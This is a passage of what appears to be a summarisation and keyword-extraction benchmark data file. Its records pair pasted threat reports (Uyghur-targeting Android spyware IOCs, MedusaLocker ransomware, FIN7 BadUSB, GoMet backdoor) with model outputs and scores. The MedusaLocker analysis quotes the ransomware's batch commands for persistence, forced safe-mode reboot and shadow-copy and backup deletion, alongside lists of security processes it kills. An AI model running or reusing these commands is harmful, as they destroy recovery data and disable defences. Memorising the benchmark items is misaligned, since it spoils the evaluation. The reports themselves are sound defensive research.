mobile devices have enabled new ways to send them to you. Phishing risks no longer simply hide in email, but in messaging, social media, and even dating apps. Because we use these devices for both, protecting against phishing is critical for our personal and professional lives.Lookout enables consumers and employees to protect their data, and to securely stay connected without violating their privacy and trust. Our platform uses artificial intelligence to analyze data from nearly 200 million devices and over 100 million apps to protect you from the full spectrum of mobile risk. As a result, Lookout delivers modern endpoint security with the most comprehensive protection from device, network, app and phishing threats without prying into your data.To learn more, visit lookout.com.Acknowledgements This report encompasses years of research carried out by a number of researchers over the years. We would like to thank all the current and former security engineers at Lookout that have contributed to this research. A special thanks to Katie Kleemola, Michael Flossman and Andrew Blaich for their pivotal contributions to this work.Contributors Apurva Kumar, Staff Security Intelligence Engineer, LookoutKristin Del Rosso, Senior Security Intelligence Engineer, LookoutJustin Albrecht, Security Intelligence Engineer, LookoutChristoph Hebeisen, Head of Research, LookoutContact informationthreat-advisory-service@lookout.com37Appendix A: Targeted countriesWhile studying the malware in this report, evidence suggests the targeting of fourteen different countries based on language-specific app titles, in-app content and domain names. Twelve out of the fourteen countries are on the Chinese government\u2019s \u201c26 Sensitive Countries\u201d list, as foundin the Human Rights Watch report on \u201cEradicating Ideological Viruses: China\u2019s Campaign of Repression Against Xinjiang\u2019s Muslims\u201d44. This compounds our understanding that this long- running toolset is a nation state actor at work and their target is the Uyghur population.CountryAfghanistanChinaEgyptFranceIndonesiaIranKazakhstanKuwaitMalaysiaPakistanOn the ChineseTargeted by thegovernment\u2019sSurveillancewarelist of sensitivediscussed in thiscountriesreportEvidence of targetig\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714Titles and in-app content in Pashto \u0649\u0633\u0627\u0626\u06c7\u062f \u06d5\u0631\u0627\u062e\u0649\u062a\u0633\u0649\u0626 E.g. \u201c \u201dChinese titles for all malware in this reportE.g. \u201c\u201d, \u201c\u201dDomain name egyptedu-online[.]comDomain name francedu-online[.]comTitles and in-app content in Indonesian E.g. \u201cMarbel Doa Islam\u201d \u201cTafsir 1001 Mimpi\u201dTitles and in-app content in PersianTitles and in-app content for Kazakhstan E.g. \u201cKazgu\u201d45Titles and in-app content focusing on Kuwaiti services E.g. \u201cA2Z Kuwait FM Radio\u201dTitles and in-app content in Malay E.g. \u201cFiqih Islam Lengkap\u201d \u201cDoa Harian Islam\u201d \u201cKumpulan Doa-Doa\u201dTitles and content in Pashto and/or Urdu E.g.\u201cShadi Ki Pehli Raat\u201d44 url url ArabiaSyriaTurkeyUzbekistan\u2714\u2714\u2714\u2714\u2714\u2714\u2714\u2714Domain name arabiaedu-online[.]comTitles and in-app content focusing on Syria E.g. \u201cSyria News\u201dTitles, domain names, and in-app content focusing on Turkey E.g. Domains: turknews-online[.]com turkyedu-online[.]com Titles: \u201cT\u00fcrk Tarihindeki imparatorluklar\u201d \u201cTurkey Navigation\u201d \u201cAl Quran Turkish\u201d etc.Titles, and in-app content in Uzbek E.g. \u201cQum basqan sheher\u201d \u201cUyghurum radiosi\u201d39Appendix B: Indicators of compromiseSilkBeanCommand and control infrastructurewww.turkyedu-online[.]com www.englishedu-online[.]com tree.ddns[.]us coco.wikaba[.]com umare.zyns[.]com phpyahoo.mrbasic[.]com androidapps.spdns[.]eu androidapps.fvk[.]cc androidapps.linkpc[.]net androidapps.duia[.]inheartsys.dnsapi[.]info androidapps.nsupdate[.]info android.apps.us[.]to androidapps.spdns[.]org androidapps.npff[.]co androidapps.home.hn[.]org androidapps.nerdpol[.]ovh androidapps.myfirewall[.]org androidapps.jetos[.]comandroidsapps[.]ml androidapps.tempors[.]com wephone[.]top www.turknews-online[.]com www.cookedu-online[.]com 176.31.115[.]156 joke.upupdate[.]cn:6006 sz.secpert[.]com:8080 103.66.217[.]15:8443 103.75.3[.]59:8443 6006.upupdate[.]cn:8443 ss903.w3.ezua[.]com:8443 ss904.w3.ezua[.]com:8443 119.36.193[.]210:8888 58.49.109[.]166:8011SHA-1 hashes58.49.109[.]166:8012 59.188.236[.]193:8012 59.188.85[.]70:8089 61.134.50[.]45:801 61.134.50[.]45:8011 103.66.217[.]15:8008 103.85.21[.]175:8088 6006.secpert[.]com:8008 s101.secpert[.]com:8088 111.172.155[.]190:60066s2.upupdate[.]cn:8088 113.57.68[.]223:15005 amote-366.vicp[.]cc:15005 103.105.59[.]47:8081 110.153.177[.]126:1882 103.74.193[.]122:8081 183.94.24[.]18:15005 203.124.14[.]109:8080 113.200.218[.]226:8086 103.255.177[.]45:8086 150.107.3[.]188 118.193.232[.]169:8086 185.170.210[.]98:8086SHA-1 hashes103.59.166[.]106:8086 www.vipapkdownload[.]com 103.255.177[.]60:8086 www.nortonservice[.]net:4430 106.12.39[.]148:8086 100.64.223[.]251:8888 10.194.103[.]47:8086vipappdownload[.]com 103.56.17[.]108 101.78.230[.]99 103.255.177[.]61:8086 ", "generated_text": "the report; Lookout researchers; four Android surveillanceware tools; the Uyghur group; Chinese; SilkBean; DoubleAgent; CarbonSteal; GoldenEagle; CarbonSteal; other malware families; HenBox; PhantomPlugin; Spywaller; DarthPusher; the malware families; years; documents; credentials; a mobile arsenal; variants; HenBox; HenBoxFireEye; Chrome; the surveillanceware; a variety of languages; the malware; Chinese; infrastructure; connections; Chinese national security guidelines; counter-terrorism efforts; 2015; Chinese national security standards; indicators; compromise; use.", "ref_text": "<START-1>The PDF report details mobile surveillance campaigns targeting Uyghurs using Android malware tools. It was written by security researchers at Lookout in June 2020. The report focuses on four interconnected Android surveillanceware tools - SilkBean, DoubleAgent, CarbonSteal, and GoldenEagle - which have been used in long-running campaigns against Uyghurs since at least 2013. SilkBean is a small but sophisticated remote access trojan (RAT) used to target Uyghurs. It has been active since at least 2015. SilkBean shares infrastructure links with other malware like DarthPusher, HenBox, and PluginPhantom, suggesting the same group is behind these tools. DoubleAgent is an advanced Android RAT used against groups with contentious relationships with China, like Tibetans. It has spying capabilities and first appeared in 2013. New DoubleAgent samples from 2019 show continued development and targeting of Uyghurs. CarbonSteal is Android spyware tracked since 2017, focused on audio surveillance. It has infrastructure links to HenBox malware and shares certificates with DoubleAgent, DarthPusher, and other tools, again pointing to the same coordinated group. GoldenEagle is Android spyware potentially dating back to 2012. It impersonates a wide array of apps and has sophisticated data exfiltration capabilities. Links have been found between GoldenEagle, CarbonSteal, and other tools. In total, the report details a long-running, sophisticated mobile spying campaign primarily targeting the Uyghur community globally. The shared infrastructure and code links between the four malware families indicate the same Chinese state-sponsored advanced persistent threat actor is coordinating these efforts. <END-1>", "t5/keyword/hint_hit_precision": 0.2972972972972973, "t5/word/hint_hit_recall": 0.0502092050209205, "gpt3/lexical/rouge_rouge1": 0.48366013071895425, "gpt3/lexical/rouge_rouge2": 0.13566739606126915, "gpt3/lexical/rouge_rougeL": 0.20915032679738563, "gpt3/lexical/rouge_rougeLsum": 0.20915032679738563, "gpt3_generated_text": ["The Lookout Threat Intelligence team has uncovered a series of interconnected Android surveillanceware tools targeting the Uyghur ethnic minority group. These tools, known as SilkBean, DoubleAgent, CarbonSteal, and GoldenEagle, are part of a larger mAPT campaign that has been active since at least 2013. The actors behind this activity have a mobile arsenal that includes other surveillance tools such as HenBox, PluginPhantom, Spywaller, and DarthPusher. These tools have been used to target not only Uyghurs in China but also Uyghurs living outside the country, Tibetans, and Muslim populations worldwide. The development and targeting of these families align with Chinese national security directives and counter-terrorism efforts, indicating a strategic goal behind the campaign. Evidence suggests that the malware campaigns have targeted at least 14 of the 26 countries on China's list of \"Sensitive Countries.\" Lookout researchers have observed connections between SilkBean, DoubleAgent, CarbonSteal, and other malware families through shared infrastructure and command and control (C2) infrastructure. The malware has been linked to Chinese desktop APT activity, indicating a broader surveillance effort. Users of Lookout mobile security products are protected from these threats, as none of the malicious apps were available on Google Play. The surveillanceware tools target individuals who speak a variety of languages and operate in line with Chinese national security standards and guidelines implemented in 2015."]}, {"split_name": "val", "sample_id": "val_76", "prompt_text": "Extract the keywords: Cybereason vs. MedusaLocker Ransomwarecybereason.com/blog/medusalocker-ransomwareBack to Blog Cybereason Nocturnus Nov 19, 2020Research by: Tom Fakterman and Assaf DahanBackgroundThe MedusaLocker ransomware first emerged in September 2019, infecting and encrypting Windows machines around the world. There have been reports of MedusaLocker attacks across multiple industries, especially the healthcare industry which suffered a great deal of ransomware attacks during the COVID-19 pandemic.In order to maximize the chances of successful encryption of the files on the compromised machine, MedusaLocker restarts the machine in safe mode before execution. This method is used to avoid security tools that might not run when the computer starts in safe mode.MedusaLocker avoids encrypting executable files, most likely to avoid rendering the targeted system unusable for paying the ransom. To make it even more dangerous, MedusaLocker uses a combination of AES and RSA-2048, making the procedure of brute forcing the encryption practically impossible.Recently, there have been reports stating that AKO, a variant of MedusaLocker, added an element of blackmail, threatening to release stolen files publicly. This method of blackmail or extortion is starting to gain popularity in the ransomware market as reported by Cybereason earlier this year.Although data leak extortion threats have been found in some of MedusaLocker\u2019s ransom notes, Cybereason did not observe evidence of information actually being exfiltrated by the MedusaLocker ransomware at the time of this research.Cybereason Blocks MedusaLocker RansomwareKey Points1. High Severity: The Cybereason Nocturnus Team assesses the threat level as HIGH given the destructive potential of attack.2. Encrypting mapped drives: MedusaLocker encrypts shared network drives of adjacent machines on the network.3. Attempted extortion: The ransom note left by new MedusaLocker variants contains threats to publicly reveal stolen data if payments are not made.4. Detected and Prevented: Cybereason\u2019s platform fully detects and prevents the MedusaLocker ransomware.Breaking Down the AttackMany MedusaLocker infections typically start with two files, a \u2018batch\u2019 file and a powershell script saved as a \u2018txt\u2019 file:qzy.bat qzy.txtContents of the Batch fileThe qzy.bat file deployed by the attackers is designed to create persistence via a Windows Service. The service does the following tasks:1. Executes a Powershell script that resides in C:\\Windows\\SysWOW6\\qzy.txt, which contains the Ransomware payload.2. Changes registry keys to allow the service to run in safe mode.3. Enforce restart in safe mode.4. Restart the infected host.sc create purebackup binpath= \"%COMSPEC% /C start /b C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\powershell.exe -c $km = [IO.File]::ReadAllText('C:\\Windows\\SysWOW64\\qzy.txt'); IEX $km\" start= auto DisplayName= \"purebackup\"reg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /freg add HKLM\\System\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\BackupLP /ve /d \\\"Service\\\" /fbcdedit /set {default} safeboot minimalshutdown /r /f /t 00 & del %0The batch file execution portrayed in Cybereason attack tree:1/7MedusaLocker Batch file executionAfter the machine is restarted in safe mode, the created service executes and the powershell script runs. This powershell script is a PowerSploit script known as \u201cInvoke-ReflectivePEInjection\u201d. The script reflectively loads the MedusaLocker ransomware to the powershell process memory.The MedusaLocker binary encoded with base64 in the script:Powershell script snippetMutex DetectionThe first thing MedusaLocker does is to check if a process with the mutex \u201c{8761ABBD-7F85-42EE-B272-A76179687C63}\u201d exists on the machine. If the mutex already exists, the ransomware will stop its execution.CMSTP UAC BYPASS / Privilege EscalationMedusaLocker uses a known UAC bypass technique also used by other malware such as Trickbot that allows the ransomware to run with escalated privileges that enable it to carry out administrative operations. It achieves privilege escalation by leveraging the built-in Windows tool CMSTP.exe to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. An \u201c%AppData%\\Roaming\\svchostt.exe\u201d (depends on the malware variant). And then, creates persistence by a scheduled task named \u201csvhost\u201d which executes every 15 minutes:Scheduled task in CybereasonBypassing Security ProductsMedusaLocker will attempt to disable or terminate certain process and security products:wxServer.exe,wxServerView,sqlservr.exe,sqlmangr.exe,RAgui.exe,supervise.exe,Culture.exe,RTVscan.exe,Defwatch.exe,sqlbrowser.exe,winword.exe,QBW32.exe,QBDBMgr.exe,qbupdate.exe,QBCFMonitorService.exe,axlbridge.exe,QBIDPService.exe,httpd.exe,fdlauncher.exe,MsDtSrvr.exe,tomcat6.exe,java.exe,360se.exe,360doctor.exe,wdswfsafe.exe,fdlauncher.exe,fdhost.exe,GDscan.exe,ZhuDongFangYu.exeIn addition, it will attempt to disable the following services:wrapper,DefWatch,ccEvtMgr,ccSetMgr,SavRoam,sqlservr,sqlagent,sqladhlp,Culserver,RTVscan,sqlbrowser,SQLADHLP,QBIDPService,Intuit.QuickBooks.FCS,QBCFMonitorService,sqlwriter,msmdsrv,tomcat6,zhudongfangyu,SQLADHLP,vmware- usbarbitator64,vmware-converter,dbsrv12,dbeng8Deleting Backups and Preventing RecoveryMedusaLocker uses the following hardcoded commands to remove backups in order to foil any recovery attempts:Hardcoded commands in the malwareCommandPurposevssadmin.exe Delete Shadows /All /QuietDeleting all shadow copy volumesbcdedit.exe /set {default} recoveryenabled NoDisabling Automatic Startup Repairbcdedit.exe /set {default} bootstatuspolicy ignoreallfailuresDisabling Windows Error Recovery on startupwbadmin DELETE SYSTEMSTATEBACKUPDeleting backup for Windows Serverwbadmin DELETE SYSTEMSTATEBACKUP -deleteOldestDeleting the oldest backup on Windows ServerMedusaLocker execution in the memory of powersehll.exe:3/7MedusaLocker execution from PowershellScanning and Propagating to Remote MachinesAfter a successful infection, the MedusaLocker will scan the entire subnet in order to detect other hosts and shared folders. The ransomware edits the value \u201cEnableLinkedConnections\u201d of the following registry key:HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\CurrentVersion\\Policies\\System\u201cEnableLinkedConnections\u201d value is changedIt does that so it can connect to other adjacent hosts residing on the same network, and in addition, tries to ping the entire subnet to see which hosts are alive:Ping sweep to find live hostsEncryption Whitelist FoldersMedusaLocker avoids encrypting executable files as well as taking a whitelisting approach, and encrypts files in most folders with the exception of:%User Profile%\\AppData\\ProgramData\\Program Files\\Program Files (x86)\\AppData\\Application Data\\intel\\nvidia\\Users\\All Users\\WindowsRansom NoteAlthough the ransom note of MeduzaLocker states that data has been exfiltrated, we have not observed indications of such behavior at the moment by the malware:4/7Ransom noteCybereason Detection and PreventionCybereason is able to both detect and prevent the execution of MedusaLocker using the powershell protection component:Malicious powershell script preventedAdditionally, when the Anti-Ransomware feature is enabled, behavioral detection techniques in the platform are able to detect the deletion of the shadow copies using vssadmin.exe, which will create a Malop for the ransomware behaviour:Ransomware preventedMitre Att&ck BreakdownExecutionPersistencePrivilege EscalationDefense EvasionLateral MovementImpactWindows Command ShellWindows ServiceBypass User Access ControlDynamic-link Library InjectionSMB/Windows Admin SharesData Encrypted for Impact5/7PowershellScheduled ", "generated_text": "Cybereason; ransomware; MedusaLocker; September 2019; malware; Windows; the ransom note; AKO; AKO; blackmail; stolen data; the ransom note; high Severity; attacks; mapped drives; a PowerSploit script; a PowerSploit script; the ransomware payload; a PowerShell script; the malware; the ransom note; summary; the attack; System; security tools; detection.", "ref_text": "<START-1>The document analyzes the MedusaLocker ransomware which first emerged in September 2019 and has targeted organizations across industries, including healthcare. MedusaLocker uses various techniques to maximize chances of successful encryption: Restarts machine in safe mode to avoid security products. Avoids encrypting executables to maintain system operability. Uses AES and RSA-2048 encryption. Threatens data leak extortion in ransom notes It uses a batch script and PowerShell loader to gain persistence and elevation. It terminates processes and disables services of security products. It deletes backups and shadow copies to prevent recovery. After infecting a system, it scans the subnet for other machines and shares to propagate. The ransomware avoids encrypting certain whitelist folders. It leaves a ransom note threatening data leak extortion but no exfiltration was observed. Detection and prevention of the ransomware is demonstrated using Cybereason's Anti-Ransomware feature and Powershell protection. The Mitre ATT&CK framework is used to map the ransomware's tactics. Indicators of Compromise and hashes for the ransomware executables, batch script, and PowerShell loader are provided. The threat level is assessed as high due to the ransomware's destructive potential. <END-1>", "t5/keyword/hint_hit_precision": 0.23076923076923078, "t5/word/hint_hit_recall": 0.03888888888888889, "gpt3/lexical/rouge_rouge1": 0.5032679738562091, "gpt3/lexical/rouge_rouge2": 0.17105263157894737, "gpt3/lexical/rouge_rougeL": 0.2745098039215686, "gpt3/lexical/rouge_rougeLsum": 0.2745098039215686, "gpt3_generated_text": ["The article discusses the emergence of the MedusaLocker ransomware in September 2019, which targets Windows machines worldwide. MedusaLocker utilizes various tactics to evade security tools and encrypt files, including restarting the machine in safe mode before execution and using a combination of AES and RSA-2048 encryption. Recent variants of MedusaLocker, such as AKO, have added blackmail elements, threatening to release stolen data if ransom payments are not made. Cybereason's Nocturnus Team assesses the threat level as high due to the destructive potential of the attack. The article details the attack process, including the deployment of batch files and PowerShell scripts to create persistence and execute the ransomware. Cybereason's platform is able to detect and prevent MedusaLocker attacks."]}, {"split_name": "val", "sample_id": "val_77", "prompt_text": "Extract the keywords: FIN7 Uses Flash Drives to Spread Remote Access Trojangeminiadvisory.io/fin7-flash-drives-spread-remote-access-trojanJanuary 13, 2022Executive Summary Recorded Future analysts continue to monitor the activities of the FIN7 group as they adapt and expand their cybercrime operations. Gemini has conducted a more in-depth investigation into these types of attack after a Gemini source provided analysts with the file \u201csketch_jul31a.ino\u201d, which was linked to FIN7\u2019s BadUSB attacks. The file had the extension (.INO), indicating it contained the source code for an Arduino \u201csketch\u201d (the Arduino term for a program). BleepingComputer also recently released a public report on FIN7\u2019s use of the \u201cBadUSB\u201d attack method, outlining the activity around this type of attack.The Arduino platform provides a common set of software utilities and libraries for constructing programs to run on platform-compatible microcontrollers. The platform uses a simplified version of the C++ programming language and provides foundational libraries, an integrated development environment for constructing the sketch, a compiler, and a means of uploading the compiled sketch to a device with a compatible microcontroller. In the Arduino ecosystem, the microcontroller executes the compiled sketch, making it operating system (OS) agnostic.Hackers have leveraged the Arduino platform to create trojanized USB devices that emulate keyboards and inject keystrokes. In most cases, the sketches on these trojanized devices connect to a malicious actor\u2019s file repository, download additional software, and install it on the victim system. In March 2020,1/7security analysts from Trustwave SpiderLabs reported that FIN7 targeted a US company by sending one of its employees a USB device trojanized with keystroke injection malware.Key FindingsFIN7 used an Arduino sketch file called \u201csketch_jul31a.ino\u201d to install malware on USB devices as part of BadUSB attacks. FIN7 uses the trojanized USB devices to ultimately load the IceBot Remote Access Trojan (RAT), resulting in FIN7 gaining unauthorized remote access to systems within victims\u2019 networks. We identified 9 IP addresses that host FIN7\u2019s malicious payloads and 3 FIN7 command-and-control (C2) servers, one of which contains a control panel for managing infected systems. The control panel displayed a list of systems infected with the IceBot RAT and pertinent information about each installation.Attack Analysis Gemini specialists conducted the analysis of the file \u201csketch_jul31a.ino\u201d. \u201c.INO\u201d is a file extension associated with the Arduino microcontroller programming platform, while \u201csketch\u201d is the platform\u2019s term for a program. Malicious actors have taken advantage of the Arduino platform and its support for microcontrollers installed on USB devices to install malware. When a USB is maliciously used as a virtual keyboard, the attack is called a \u201ckeystroke injection\u201d, \u201cBadUSB\u201d, or \u201cRubber Ducky\u201d attack.Figure 1: The attack flow of the Fin7 USB attack (Source: Recorded Future)This attack\u2019s use of keyboard injection capitalizes on Microsoft Windows\u2019 default behavior of automatically trusting USB keyboards. It uses Arduino-compatible microcontrollers that are hidden in what appear to be typical USB devices but are actually programmed to function as virtual keyboards (usually based on ESP8266, Atmega32u4, or ATtiny85 microcontrollers). The sketch sends keystrokes to activate a shell and execute additional commands on the victim system.2/7Figure 2: Arduino sketch source code from the file \u201csketch_jul31a.ino\u201d (Source: Recorded Future)The \u201csketch_jul31a.ino\u201d file (Figure 2) contains the source code for an Arduino sketch designed to run scripts on a Windows system. First, the sketch opens the \u201cRun\u201d dialog by sending the \u201cWindows\u201d + \u201cR\u201d keys. Next, it sends the keystrokes for \u201ccmd.exe\u201d to the \u201cRun\u201d dialog to execute a command prompt. The sketch then sends keystrokes to execute \u201cpowershell.exe -w h -command Invoke-Expression\u201d, which runs the PowerShell interpreter in a hidden window and executes a script that is passed in-line. This script downloads and installs malware from the IP address 206.54.190[.]230. As shown in the table below, further analysis revealed 8 additional IP addresses used to host FIN7\u2019s malicious payload.IP AddressFirst SeenLast Seen138.124.180[.]127 2021-07-29 12:26:10 2021-08-10 12:03:34185.232.170[.]242021-07-29 9:21:312021-10-21 13:03:42185.233.80[.]1492021-07-29 9:50:262021-10-21 14:38:00185.53.46[.]1002021-07-29 13:47:48 2021-11-20 10:08:13206.54.191[.]372021-07-29 12:37:53 2021-10-21 16:13:5837.1.213[.]1942021-07-29 10:48:31 2021-08-10 9:26:0145.142.215[.]1482021-10-21 15:17:31 2021-10-21 15:17:315.252.177[.]2152021-07-29 14:18:09 2021-10-21 11:20:573/7Figure 3: Contents of the downloaded file wis.txt (Source: Recorded Future)After downloading the file \u201cwis.txt\u201d from the malicious server, the PowerShell script decodes the file via the command \u201ccertutil -decode hex\u201d, a command-line program and routine that is part of Microsoft Windows Certificate Services. The decoding results in another PowerShell script, saved to \u201cC:\\windows\\temp\\wis.ps1\u201d.Figure 4: Result of hex-decoding wis.txt into wis.ps1 (Source: Recorded Future)This script contains a large block of compressed data, which the script decompresses using the PowerShell IO.Compression.DeflateStream routine. The result is a .NET assembly (executable module), which the script loads into the current execution context through a call to Reflection.Assembly::Load.4/7Figure 5: The function for decoding and decrypting the reflective loader shellcode, rewritten to Python. (Source: Recorded Future)Once loaded, the .NET assembly decodes a block of data that has been XOR-obfuscated with the key \u201cqawsed1q2w3e\u201d. The result is a reflective loader shellcode that installs the IceBot Remote Access Trojan (RAT), previously known as Lizar, Tirion, and Diceloader.Remote Access Trojan AnalysisThe RAT executable dropped by \u201csketch_jul31a.ino\u201d contains 2 command-and-control (C2) addresses: 199.80.55[.]66 and 207.246.92[.]213. Analysis of the fingerprints for these 2 IP addresses reveals an additional C2 server hosted on IP 185.250.151[.]126, and we were able to view the C2 control panel.Figure 6: Hex View snapshot of IceBot showing C2 IP addresses (Source: Recorded Future)Figure 7: The main window of the control panel of IceBot version 2.1.1. The IP address of the C2 server is 185.250.151[.]126:443. (Source: Recorded Future)The control panel displays a list of systems infected with the RAT, along with pertinent information about each installation, such as IP address, OS, process identifier (PID), antivirus software, communication history, and next update interval.5/7Figure 8: The list of commands for the control panel of the RAT (Source: Recorded Future)Selecting an infected system and bringing up a context menu allows the threat actor to interact with the RAT and execute commands. As can be seen in Figure 8, several commands are available for managing The use of trojanized USB devices for keystroke injection is not a new technique, even for FIN7. Typically the attack targets specific persons with access to the computer systems of the intended victim company. As FIN7 has recently ventured into ransomware, it makes sense for them to look for alternative avenues of infecting computers that are monitored by layers of protective systems, such as firewalls, email scanners, proxy servers, and endpoint security. The tactics and techniques involved in trojanized USB attacks enable FIN7 actors to avoid many of these network-level and endpoint protections by dispensing with malware transmission over the network, minimizing the use of files on disk and employing multiple layers of encoding of the malware\u2019s scripts and executable code.Pertinently, FIN7 recently created \u201cBastion Secure\u201d, a fake information security company, and employed system administrators to unknowingly assist in system exploitation. It is possible that trojanized USBs are being constructed and used by these administrators for penetration testing. Alternatively, they might also6/7be providing trojanized USBs to clients or prospective clients through some form of ruse (for example, telling the client it contains documentation on the fake company\u2019s services). In either case, the clients or prospective clients could become victims of a trojanized USB attack, resulting in FIN7 gaining unauthorized remote access to systems within victims\u2019 networks.7/7 ", "generated_text": "the Flash Drive; FIN7; Flash drives; unauthorized remote access; systems; the USB; a USB; keyboard injection; BadUSB attacks; a RAT; the trojanized USB devices; a USB device; a malicious actor; malware; The attack; the IceBot Remote Access Trojan; this attack; victims; Firewall; a control panel; a list; the IceBot RAT; the activity; the group; the activities.", "ref_text": "<START-1>The cybercrime group FIN7 has been using \"BadUSB\" attacks to spread malware. They distribute USB devices containing malicious Arduino sketches that act as keyboards. When plugged in, the sketch executes PowerShell to download and install the IceBot remote access trojan (RAT). This allows FIN7 to gain unauthorized access to target networks. Analysis of the sketch code shows it opens a hidden PowerShell window to download the trojan from IP addresses linked to FIN7. The RAT then connects to FIN7 command and control servers. A control panel was discovered showing systems infected with IceBot, including info like IP, OS, antivirus, and options to interact with the RAT. This attack method avoids firewalls and email filters by not transmitting malware over the network. Encoding and scripts minimize malware files for stealth. FIN7 recently created a fake security company potentially to construct trojanized USBs. They may be using unwitting admins or sending them to clients for social engineering. The USB-based attack represents an evolution in tactics for FIN7 to gain persistent access and evade protections as they expand into ransomware operations. Defenses should focus on physical media controls and monitoring for suspicious USB activities. <END-1>", "t5/keyword/hint_hit_precision": 0.32, "t5/word/hint_hit_recall": 0.08376963350785341, "gpt3/lexical/rouge_rouge1": 0.4679487179487179, "gpt3/lexical/rouge_rouge2": 0.18709677419354837, "gpt3/lexical/rouge_rougeL": 0.30128205128205127, "gpt3/lexical/rouge_rougeLsum": 0.30128205128205127, "gpt3_generated_text": ["The article explores how the cybercrime group FIN7 is using malicious Arduino sketch files on USB devices to conduct BadUSB attacks, ultimately installing the IceBot Remote Access Trojan (RAT) on victims' systems. This allows FIN7 to gain unauthorized remote access to systems within victims' networks. The article also identifies the IP addresses hosting FIN7's malicious payloads and reveals three FIN7 command-and-control (C2) servers, one of which contains a control panel for managing infected systems. The attack involves using trojanized USB devices that emulate keyboards to inject keystrokes, taking advantage of Windows' default trust in USB keyboards. The Arduino sketch file \"sketch_jul31a.ino\" contains code that triggers the execution of PowerShell commands to download and install malware."]}, {"split_name": "val", "sample_id": "val_78", "prompt_text": "Extract the keywords: blog.talosintelligence.com /2022/07/attackers-target-ukraine-using-gomet.html Attackers target Ukraine using GoMet backdoorExecutive summarySince the Russian invasion of Ukraine began, Ukrainians have been under a nearly constant barrage of cyber attacks. Working jointly with Ukrainian organizations, Cisco Talos has discovered a fairly uncommon piece of malware targeting Ukraine \u2014 this time aimed at a large software development company whose software is used in various state organizations within Ukraine. We believe that this campaign is likely sourced by Russian state-sponsored actors or those acting in their interests. As this firm is involved in software development, we cannot ignore the possibility that the perpetrating threat actor's intent was to gain access to source a supply chain-style attack, though at this time we do not have any evidence that they were successful. Cisco Talos confirmed that the malware is a slightly modified version of the open-source backdoor named \"GoMet.\" The malware was first observed on March 28, 2022. GoMet backdoorThe story of this backdoor is rather curious \u2014 there are two documented cases of its usage by sophisticated threat actors. First, in 2020, attackers were deploying this malware after the successful exploitation of CVE-2020-5902, a vulnerability in F5 BIG-IP so severe that USCYBERCOM posted a tweet urging all users to patch the application. The second is more recent and involved the successful exploitation of CVE-2022-1040, a remote code execution vulnerability in Sophos Firewall.1/7Both cases are very similar. They both start with the exploitation of a public vulnerability on appliances where the malicious actors then dropped GoMet as a backdoor. As of publishing time, Cisco Talos has no reason to believe these cases are related to the usage of this backdoor in Ukraine.The original GoMet author posted the code on GitHub on March 31, 2019 and had commits until April 2, 2019. The commits didn't add any features but did fix some code convention aesthetics. The backdoor itself is a rather simple piece of software written in the Go programming language. It contains nearly all the usual functions an attacker might want in a remotely controlled agent. Agents can be deployed on a variety of operating systems (OS) or architectures (amd64, arm, etc.). GoMet supports job scheduling (via Cron or task scheduler depending on the OS), single command execution, file download, file upload or opening a shell. An additional notable feature of GoMet lies in its ability to daisy chain \u2014 whereby the attackers gain access to a network or machine and then use that same information to gain access to multiple networks and computers \u2014 connections from one implanted host to another. Such a feature could allow for communication out to the internet from otherwise completely \"isolated\" hosts.This version was changed by malicious actors, in the original code, the cronjob is configured to be executed once every hour on the hour. In our samples, the cronjob is configured to run every two seconds. This change makes the sample slightly more noisy since it executes every two seconds, but also prevents an hour-long sleep if the connection fails which would allow for more aggressive reconnection to the C2.The objective of the cron job defined in the main part of the malware is to check if it's connected to the C2, if not it will start the agent component again and connect to the C2. The picture below shows the execution flow of the C2 setup routine Agent.Start.2/7This flow reveals another change to the GitHub versions. If the C2 is unreachable, the sample will sleep for a random amount of time between five and 10 minutes. GO's sleep implementation uses nanoseconds. The Pseudo Code would look like the following: time_Sleep(1000000000 * (rnd_val + 300)).The 'WaitGroup_Add' call in the disassembly screenshot can also be confusing. The trick is, the Go compiler is changing the source code WaitGroup.Done() to WaitGroup.Add(-1).After the Agent.start routine is done, the next cron job triggered the execution of the serve() routine and different configuration.If we look closely at the functions, they are not 100% equal, but we can see that the changes are mainly strings and similar victim or compiler-dependent data, along with researcher comments. Below is the Main.Main function as an example.5/7The malicious activity we detected included a fake Windows update scheduled tasks created by the GoMet dropper. Additionally, the malware used a somewhat novel approach to persistence. It enumerated the autorun values and, instead of creating a new one, replaced one of the existing goodware autorun executables with the malware. This potentially could avoid detection or hinder forensic analysis.In one of the cases, about 60 seconds before the schtask query is executed, a blank CMD process is opened and then subsequently executes systeminfo and schtask queries rather than these queries being chain opened by svchost or services or another process. This execution looks like:C:\\WINDOWS\\system32\\cmd.exe 7)systeminfoschtasks /query /tn microsoft\\windows\\windowsupdate\\scheduledschtasks /query /tn microsoft\\windows\\windowsupdate\\scheduled /v InfrastructureBoth samples have the command and control (C2) IP address hardcoded, which is 111.90.139[.]122. Communication occurs via HTTPS on the default port.6/7The certificate on this server was issued on April 4, 2021 as a self-signed certificate, with the preparation began as early as April 2021. At the moment, there are no known domains associated with this IP address and the last time there was a domain associated with it was on Jan. 23, 2021, which is outside the known attack time frame. ConclusionAs the war in Ukraine rages on with little resolution in sight, we are reminded that attackers will try just about anything to gain additional leverage over their Ukrainian adversaries. Cisco Talos expects to see the continued deployment of a range of cyber weapons targeting the Ukrainian government and its counterparts. We remain vigilant and are committed to helping Ukraine defend its networks against such cyber attacks and working closely with our strategic allies in the region to gather and provide actionable threat intelligence.In this instance, we saw a software company targeted with a backdoor designed for additional persistent access. We also observed the threat actor take active steps to prevent detection of their tooling by obfuscating samples and utilizing novel persistence techniques. This access could be leveraged in a variety of ways, including deeper access or launching additional attacks, including the potential for software supply chain compromise. It's a reminder that although the cyber activities haven't necessarily risen to the level many have expected, Ukraine is still facing a well-funded, determined adversary that can inflict damage in a variety of ways \u2014 this is just the latest example of those attempts.We assess with moderate to high confidence that these actions are being conducted by Russian state- sponsored actors or those acting in their interests.Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Indicators of Compromise ", "generated_text": "malware; a software development company; Ukraine; Russian; state organizations; a backdoor; GoMet; GitHub; March 2019; a cron job; the 